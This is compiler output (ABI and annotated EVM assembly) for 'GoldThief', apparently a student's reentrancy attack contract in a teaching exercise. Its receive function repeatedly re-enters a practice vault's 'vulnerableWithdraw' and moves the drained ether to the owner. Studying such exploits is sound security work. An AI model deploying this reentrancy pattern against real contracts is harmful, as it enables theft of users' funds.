{
	"submissions/Zora/GoldThief.sol": {
		"GoldThief": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vaultAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attackCount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackSafe",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackVulnerable",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackingSafe",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "stealLoot",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "targetVault",
					"outputs": [
						{
							"internalType": "contract IVault",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"submissions/Zora/GoldThief.sol\":318:1715  contract GoldThief {... */\n  mstore(0x40, 0x80)\n    /* \"submissions/Zora/GoldThief.sol\":447:553  constructor(address _vaultAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"submissions/Zora/GoldThief.sol\":510:523  _vaultAddress */\n  dup1\n    /* \"submissions/Zora/GoldThief.sol\":489:500  targetVault */\n  0x00\n  0x00\n    /* \"submissions/Zora/GoldThief.sol\":489:524  targetVault = IVault(_vaultAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"submissions/Zora/GoldThief.sol\":539:549  msg.sender */\n  caller\n    /* \"submissions/Zora/GoldThief.sol\":531:536  owner */\n  0x01\n  0x00\n    /* \"submissions/Zora/GoldThief.sol\":531:549  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"submissions/Zora/GoldThief.sol\":447:553  constructor(address _vaultAddress) {... */\n  pop\n    /* \"submissions/Zora/GoldThief.sol\":318:1715  contract GoldThief {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"submissions/Zora/GoldThief.sol\":318:1715  contract GoldThief {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"submissions/Zora/GoldThief.sol\":318:1715  contract GoldThief {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x67a3fde8\n      gt\n      tag_11\n      jumpi\n      dup1\n      0x67a3fde8\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x71cb791a\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_9\n      jumpi\n      dup1\n      0xcff53a4a\n      eq\n      tag_10\n      jumpi\n      jump(tag_2)\n    tag_11:\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x1f92db45\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x407c2821\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x494eba64\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"submissions/Zora/GoldThief.sol\":1197:1208  attackCount */\n      0x02\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":1197:1210  attackCount++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_14\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1224:1237  attackingSafe */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1223:1237  !attackingSafe */\n      iszero\n        /* \"submissions/Zora/GoldThief.sol\":1223:1280  !attackingSafe && address(targetVault).balance >= 1 ether */\n      dup1\n      iszero\n      tag_16\n      jumpi\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1273:1280  1 ether */\n      0x0de0b6b3a7640000\n        /* \"submissions/Zora/GoldThief.sol\":1249:1260  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1241:1269  address(targetVault).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"submissions/Zora/GoldThief.sol\":1241:1280  address(targetVault).balance >= 1 ether */\n      lt\n      iszero\n        /* \"submissions/Zora/GoldThief.sol\":1223:1280  !attackingSafe && address(targetVault).balance >= 1 ether */\n    tag_16:\n        /* \"submissions/Zora/GoldThief.sol\":1223:1299  !attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5 */\n      dup1\n      iszero\n      tag_17\n      jumpi\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1298:1299  5 */\n      0x05\n        /* \"submissions/Zora/GoldThief.sol\":1284:1295  attackCount */\n      sload(0x02)\n        /* \"submissions/Zora/GoldThief.sol\":1284:1299  attackCount < 5 */\n      lt\n        /* \"submissions/Zora/GoldThief.sol\":1223:1299  !attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5 */\n    tag_17:\n        /* \"submissions/Zora/GoldThief.sol\":1219:1352  if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {... */\n      iszero\n      tag_18\n      jumpi\n        /* \"submissions/Zora/GoldThief.sol\":1312:1323  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1312:1342  targetVault.vulnerableWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x710957cc\n        /* \"submissions/Zora/GoldThief.sol\":1312:1344  targetVault.vulnerableWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      revert(0x00, 0x00)\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1219:1352  if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {... */\n    tag_18:\n        /* \"submissions/Zora/GoldThief.sol\":1364:1377  attackingSafe */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1360:1462  if (attackingSafe) {... */\n      iszero\n      tag_22\n      jumpi\n        /* \"submissions/Zora/GoldThief.sol\":1390:1401  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1390:1414  targetVault.safeWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x7fd42617\n        /* \"submissions/Zora/GoldThief.sol\":1390:1416  targetVault.safeWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      revert(0x00, 0x00)\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1360:1462  if (attackingSafe) {... */\n    tag_22:\n        /* \"submissions/Zora/GoldThief.sol\":318:1715  contract GoldThief {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"submissions/Zora/GoldThief.sol\":1619:1712  function getBalance() external view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_26\n      jumpi\n      revert(0x00, 0x00)\n    tag_26:\n      pop\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      tag_29\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"submissions/Zora/GoldThief.sol\":340:365  IVault public targetVault */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_31\n      jumpi\n      revert(0x00, 0x00)\n    tag_31:\n      pop\n      tag_32\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      tag_34\n      swap2\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"submissions/Zora/GoldThief.sol\":391:414  uint public attackCount */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_36\n      jumpi\n      revert(0x00, 0x00)\n    tag_36:\n      pop\n      tag_37\n      tag_38\n      jump\t// in\n    tag_37:\n      mload(0x40)\n      tag_39\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"submissions/Zora/GoldThief.sol\":876:1159  function attackSafe() external payable {... */\n    tag_6:\n      tag_40\n      tag_41\n      jump\t// in\n    tag_40:\n      stop\n        /* \"submissions/Zora/GoldThief.sol\":557:872  function attackVulnerable() external payable {... */\n    tag_7:\n      tag_42\n      tag_43\n      jump\t// in\n    tag_42:\n      stop\n        /* \"submissions/Zora/GoldThief.sol\":417:442  bool public attackingSafe */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_44\n      jumpi\n      revert(0x00, 0x00)\n    tag_44:\n      pop\n      tag_45\n      tag_46\n      jump\t// in\n    tag_45:\n      mload(0x40)\n      tag_47\n      swap2\n      swap1\n      tag_48\n      jump\t// in\n    tag_47:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"submissions/Zora/GoldThief.sol\":368:388  address public owner */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_49\n      jumpi\n      revert(0x00, 0x00)\n    tag_49:\n      pop\n      tag_50\n      tag_51\n      jump\t// in\n    tag_50:\n      mload(0x40)\n      tag_52\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_52:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"submissions/Zora/GoldThief.sol\":1479:1615  function stealLoot() external {... */\n    tag_10:\n      callvalue\n      dup1\n      iszero\n      tag_54\n      jumpi\n      revert(0x00, 0x00)\n    tag_54:\n      pop\n      tag_55\n      tag_56\n      jump\t// in\n    tag_55:\n      stop\n        /* \"submissions/Zora/GoldThief.sol\":1619:1712  function getBalance() external view returns (uint256) {... */\n    tag_28:\n        /* \"submissions/Zora/GoldThief.sol\":1664:1671  uint256 */\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":1687:1708  address(this).balance */\n      selfbalance\n        /* \"submissions/Zora/GoldThief.sol\":1680:1708  return address(this).balance */\n      swap1\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1619:1712  function getBalance() external view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":340:365  IVault public targetVault */\n    tag_33:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":391:414  uint public attackCount */\n    tag_38:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":876:1159  function attackSafe() external payable {... */\n    tag_41:\n        /* \"submissions/Zora/GoldThief.sol\":944:949  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":930:949  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":930:940  msg.sender */\n      caller\n        /* \"submissions/Zora/GoldThief.sol\":930:949  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"submissions/Zora/GoldThief.sol\":922:964  require(msg.sender == owner, \"Only owner\") */\n      tag_59\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_60\n      swap1\n      tag_61\n      jump\t// in\n    tag_60:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_59:\n        /* \"submissions/Zora/GoldThief.sol\":992:999  1 ether */\n      0x0de0b6b3a7640000\n        /* \"submissions/Zora/GoldThief.sol\":979:988  msg.value */\n      callvalue\n        /* \"submissions/Zora/GoldThief.sol\":979:999  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"submissions/Zora/GoldThief.sol\":971:1023  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n      tag_62\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_63\n      swap1\n      tag_64\n      jump\t// in\n    tag_63:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_62:\n        /* \"submissions/Zora/GoldThief.sol\":1048:1052  true */\n      0x01\n        /* \"submissions/Zora/GoldThief.sol\":1032:1045  attackingSafe */\n      0x03\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":1032:1052  attackingSafe = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1073:1074  0 */\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":1059:1070  attackCount */\n      0x02\n        /* \"submissions/Zora/GoldThief.sol\":1059:1074  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1083:1094  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1083:1102  targetVault.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"submissions/Zora/GoldThief.sol\":1110:1119  msg.value */\n      callvalue\n        /* \"submissions/Zora/GoldThief.sol\":1083:1122  targetVault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_65\n      jumpi\n      revert(0x00, 0x00)\n    tag_65:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_67\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_67:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":1129:1140  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1129:1153  targetVault.safeWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x7fd42617\n        /* \"submissions/Zora/GoldThief.sol\":1129:1155  targetVault.safeWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_68\n      jumpi\n      revert(0x00, 0x00)\n    tag_68:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_70\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_70:\n      pop\n      pop\n      pop\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":876:1159  function attackSafe() external payable {... */\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":557:872  function attackVulnerable() external payable {... */\n    tag_43:\n        /* \"submissions/Zora/GoldThief.sol\":631:636  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":617:636  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":617:627  msg.sender */\n      caller\n        /* \"submissions/Zora/GoldThief.sol\":617:636  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"submissions/Zora/GoldThief.sol\":609:651  require(msg.sender == owner, \"Only owner\") */\n      tag_72\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_73\n      swap1\n      tag_61\n      jump\t// in\n    tag_73:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_72:\n        /* \"submissions/Zora/GoldThief.sol\":679:686  1 ether */\n      0x0de0b6b3a7640000\n        /* \"submissions/Zora/GoldThief.sol\":666:675  msg.value */\n      callvalue\n        /* \"submissions/Zora/GoldThief.sol\":666:686  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"submissions/Zora/GoldThief.sol\":658:720  require(msg.value >= 1 ether, \"Need at least 1 ETH to attack\") */\n      tag_74\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_75\n      swap1\n      tag_76\n      jump\t// in\n    tag_75:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_74:\n        /* \"submissions/Zora/GoldThief.sol\":754:759  false */\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":738:751  attackingSafe */\n      0x03\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":738:759  attackingSafe = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":780:781  0 */\n      0x00\n        /* \"submissions/Zora/GoldThief.sol\":766:777  attackCount */\n      0x02\n        /* \"submissions/Zora/GoldThief.sol\":766:781  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":790:801  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":790:809  targetVault.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"submissions/Zora/GoldThief.sol\":817:826  msg.value */\n      callvalue\n        /* \"submissions/Zora/GoldThief.sol\":790:829  targetVault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_77\n      jumpi\n      revert(0x00, 0x00)\n    tag_77:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_79\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_79:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":836:847  targetVault */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":836:866  targetVault.vulnerableWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x710957cc\n        /* \"submissions/Zora/GoldThief.sol\":836:868  targetVault.vulnerableWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_80\n      jumpi\n      revert(0x00, 0x00)\n    tag_80:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_82\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_82:\n      pop\n      pop\n      pop\n      pop\n        /* \"submissions/Zora/GoldThief.sol\":557:872  function attackVulnerable() external payable {... */\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":417:442  bool public attackingSafe */\n    tag_46:\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":368:388  address public owner */\n    tag_51:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"submissions/Zora/GoldThief.sol\":1479:1615  function stealLoot() external {... */\n    tag_56:\n        /* \"submissions/Zora/GoldThief.sol\":1538:1543  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1524:1543  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1524:1534  msg.sender */\n      caller\n        /* \"submissions/Zora/GoldThief.sol\":1524:1543  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"submissions/Zora/GoldThief.sol\":1516:1558  require(msg.sender == owner, \"Only owner\") */\n      tag_84\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_85\n      swap1\n      tag_61\n      jump\t// in\n    tag_85:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_84:\n        /* \"submissions/Zora/GoldThief.sol\":1573:1578  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1565:1588  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"submissions/Zora/GoldThief.sol\":1565:1611  payable(owner).transfer(address(this).balance) */\n      0x08fc\n        /* \"submissions/Zora/GoldThief.sol\":1589:1610  address(this).balance */\n      selfbalance\n        /* \"submissions/Zora/GoldThief.sol\":1565:1611  payable(owner).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_87\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    